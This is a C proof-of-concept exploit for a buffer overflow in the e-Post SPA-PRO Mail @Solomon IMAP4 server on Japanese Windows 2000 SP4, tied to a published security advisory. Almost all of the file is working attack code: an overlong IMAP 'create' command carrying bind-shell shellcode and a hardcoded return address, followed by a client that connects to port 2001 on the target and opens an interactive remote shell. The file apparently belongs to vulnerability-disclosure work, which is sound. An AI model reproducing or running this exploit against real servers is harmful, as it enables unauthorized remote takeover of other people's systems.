//**************************************************************************
// e-Post SPA-PRO Mail @Solomon SPA-IMAP4S 4.01 Service Buffer Overflow 
// Vulnerability
//
// Bind Shell POC Exploit for Japanese Win2K SP4
// 31 May 2005
//
// This POC code binds shell on port 2001 of a vulnerable e-Post
// SPA-PRO Mail @Solomon IMAP server.
//
// This POC assumes default mailbox configuration C:\mail\inbox\%USERNAME%
// Any changes to the mailbox configuration will cause this POC to
// fail due to the length differences.
//
//
// Advisory 
// http://www.security.org.sg/vuln/spa-promail4.html
// http://www.security.org.sg/vuln/spa-promail4-jp.html
//
//**************************************************************************

#include <stdio.h>
#include <conio.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment (lib,"ws2_32.lib")


unsigned char expBuf[] = 
"2 create \""
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x55\x8B\xEC\x33\xC9\x66\xB9\xE8\x03\x2B\xE1\x32\xC0\x8B\xFC\xF3"
"\xAA\xB1\x30\x64\x8B\x01\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x70\x08"
"\xD9\xEE\xD9\x74\x24\xF4\x5F\x83\xC7\x0C\xEB\x53\x60\x8B\x6C\x24"
"\x24\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x8B\x7E\x20\x03\xFD\x8B"
"\x4E\x18\x56\x33\xDB\x8B\x37\x03\xF5\x33\xC0\x99\xAC\x85\xC0\x74"
"\x07\xC1\xCA\x0D\x03\xD0\xEB\xF4\x3B\x54\x24\x2C\x74\x09\x83\xC7"
"\x04\x43\xE2\xE1\x5E\xEB\x16\x5E\x8B\x7E\x24\x03\xFD\x66\x8B\x04"
"\x5F\x8B\x7E\x1C\x03\xFD\x8B\x04\x87\x01\x44\x24\x24\x61\xC3\x89"
"\x75\xF4\x68\x8E\x4E\x0E\xEC\x56\xFF\xD7\x59\x33\xC0\x66\xB8\x6C"
"\x6C\x50\x68\x33\x32\x2E\x64\x68\x77\x73\x32\x5F\x54\xFF\xD1\x8B"
"\xF0\x68\xD9\x09\xF5\xAD\x56\xFF\xD7\x5B\x83\xC4\x20\x6A\x01\x6A"
"\x02\xFF\xD3\x89\x45\xD0\x68\xA4\x1A\x70\xC7\x56\xFF\xD7\x5B\x33"
"\xC0\x50\xB8\xFD\xFF\xF8\x2E\x83\xF0\xFF\x50\x8B\xC4\x6A\x10\x50"
"\xFF\x75\xD0\xFF\xD3\x68\xA4\xAD\x2E\xE9\x56\xFF\xD7\x5B\xFF\x75"
"\xD0\xFF\xD3\x8B\xCC\x6A\x10\x8B\xDC\x68\x35\x54\x8A\xA1\x56\xFF"
"\xD7\x5A\x50\x50\x53\x51\xFF\x75\xD0\xFF\xD2\x8B\xD0\x68\xE7\x79"
"\xC6\x79\x56\xFF\xD7\x58\x89\x45\xF0\x8B\x75\xF4\x83\xC4\x20\xC6"
"\x04\x24\x44\xC6\x44\x24\x2D\x01\x89\x54\x24\x38\x89\x54\x24\x3C"
"\x89\x54\x24\x40\x8B\xC4\x8D\x58\x44\x68\x72\xFE\xB3\x16\x56\xFF"
"\xD7\x5A\xB9\xFF\x63\x6D\x64\xC1\xE9\x08\x51\x8B\xCC\x53\x53\x50"
"\x33\xC0\x50\x50\x50\x6A\x01\x50\x50\x51\x50\xFF\xD2\x5B\x68\xAD"
"\xD9\x05\xCE\x56\xFF\xD7\x58\x6A\xFF\xFF\x33\xFF\xD0\xFF\x74\x24"
"\x48\xFF\x55\xF0\xFF\x75\xD0\xFF\x55\xF0\x68\xEF\xCE\xE0\x60\x56"
"\xFF\xD7\x58\xFF\xD0\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\xe9\x4f\xfe\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x54\x54\x54\x54"
"\x55\x55\x55\x55\x56\x56\x56\x56\x57\x57\x57\x57\xE9\x0C\xFE\xFF"
"\xFF\xCC\xEB\xa0\x5A\xD6\x19\xF8\x74\x41\x41\x41\x42\x42\x42\x42"
"\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"
"\x47\x47\x47\x47\x48\x48\x48\x48\x36\x49\x49\x49\x4A\x4A\x4A\x4A"
"\x4B\x4B\x4B\x4B\x4C\x4C\x4C\x4C\x4D\x4D\x4D\x4D\x4E\x4E\x4E\x4E"
"\x4F\x4F\x4F\x4F\x50\x50\x50\x50\x51\x51\x51\x51\x52\x52\x52\x52"
"\x53\x53\x53\x53\x54\x54\x54\x54\x55\x55\x55\x55\x56\x56\x56\x56"
"\x57\x57\x57\x57\x58\x58\x58\x58\x59\x59\x59\x59\x5A\x5A\x5A\x5A"
"\"\r\n";


void shell(int sockfd)
{
	char buffer[1024];
	fd_set rset;
	FD_ZERO(&rset);

	for(;;)
	{
		if(kbhit() != 0)
		{		
			fgets(buffer, sizeof(buffer) - 2, stdin);
			send(sockfd, buffer, strlen(buffer), 0);
		}

		FD_ZERO(&rset);
		FD_SET(sockfd, &rset);

		timeval tv;
		tv.tv_sec = 0;
		tv.tv_usec = 50;
		
		if(select(0, &rset, NULL, NULL, &tv) == SOCKET_ERROR)
		{
			printf("select error\n");
			break;
		}
        
		if(FD_ISSET(sockfd, &rset))
		{
			int n;

			ZeroMemory(buffer, sizeof(buffer));
			if((n = recv(sockfd, buffer, sizeof(buffer), 0)) <= 0)
			{
				printf("EOF\n");
				return;
			}
			else
			{
				fwrite(buffer, 1, n, stdout);
			}
		}
	}
}


#define ADDR_POSITION		534
#define RET_ADDR			0x74F819D6		// CALL EBX in Japanese Win2K SP4

// First short jump backwards. (EB AO) 
// You should know what to change here, landing onto INT 3 to let debugger kick in.
#define FIRST_BACKJMP_INST	0x5AA0EBCC


int main(int argc, char* argv[])
{
	WORD wVersionRequested;
	WSADATA wsaData;
	struct sockaddr_in sin;
	int err;
	char inBuffer[10000];
	char loginBuf[1000];

	if(argc != 4)
	{
		printf("\nUsage: %s <imap username> <imap password> <ip addr>\n", argv[0]);
		return 1;
	}

	if(strlen(argv[1]) <= 0 || strlen(argv[1]) > 20)
	{
		printf("\nInvalid IMAP username!  Maximum username length is 20.\n");
		return 1;
	}

	if(strlen(argv[2]) <= 0 || strlen(argv[2]) > 14)
	{
		printf("\nInvalid IMAP password!  Maximum password length is 14.\n");
		return 1;
	}

	memset(loginBuf, 0, sizeof(loginBuf));
	_snprintf(loginBuf, sizeof(loginBuf), "1 login \"%s\" \"%s\"\r\n", argv[1], argv[2]);
	loginBuf[sizeof(loginBuf)-1] = 0;

	int retPos = ADDR_POSITION - (strlen(argv[1]) - 1);
	
	*((DWORD *)&expBuf[retPos]) = RET_ADDR;
	*((DWORD *)&expBuf[retPos-4]) = FIRST_BACKJMP_INST;


	wVersionRequested = MAKEWORD(2,0);
	err = WSAStartup(wVersionRequested, &wsaData);
	if(err != 0)
	{
		printf("\nWSAStartup Error.\n");
		return 1;
	}

	if(LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 0)
	{
		printf("\nWinsock Version Error\n");
		WSACleanup();
		return 1;
	}

	SOCKET s = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

	sin.sin_addr.s_addr = inet_addr(argv[3]);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(143);

	printf("\n[+] Trying to connect to %s\n", inet_ntoa(sin.sin_addr));

	if(connect(s, (sockaddr *)&sin, sizeof(sin)) != SOCKET_ERROR)
	{
		int size;
			
		// read IMAP banner
		size = recv(s, inBuffer, sizeof(inBuffer), 0);
		if(size == SOCKET_ERROR)
		{
			printf("[-] Error receiving IMAP banner!\n");
			return 1;
		}

		printf("[+] IMAP banner received!\n\n");
		fwrite(inBuffer, 1, size, stdout);
		printf("\n");

		if(send(s, (char *)loginBuf, strlen((char *)loginBuf), 0) == SOCKET_ERROR)
		{
			printf("[-] Error sending login!\n");
			return 1;
		}

		printf("[+] Login Sent.\n");

		size = recv(s, inBuffer, sizeof(inBuffer), 0);
		if(size == SOCKET_ERROR)
		{
			printf("[-] Error receiving login reply!\n");
			return 1;
		}
		if(strstr(inBuffer, "OK"))
			printf("[+] Login successful!\n");
		else
		{
			printf("[+] Login failed!\n");
			return 1;
		}

		if(send(s, (char *)expBuf, strlen((char *)expBuf), 0) == SOCKET_ERROR)
		{
			printf("[-] Error sending exploit!\n");
			return 1;
		}
		else
		{
			printf("[+] Exploit sent!\n");
		}

		Sleep(2000);

		//================================= Connect to the target ==============================
		SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
		if(sock == INVALID_SOCKET)
		{
			printf("Invalid socket return in socket() call.\n");
			WSACleanup();
			return -1;
		}

		sin.sin_family = AF_INET;
		sin.sin_port = htons(2001);
		sin.sin_addr.s_addr = inet_addr(argv[3]);

		if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
			printf("Exploit Failed. SOCKET_ERROR return in connect call.\n");
			closesocket(sock);
			WSACleanup();
			return -1;
		}
		
		printf("[+] Exploit successful!\n\n");
		shell(sock);
		closesocket(sock);	
	}
	else
	{
		printf("[-] Cannot connect!\n");
	}

	closesocket(s);
	WSACleanup();

	return 0;
}

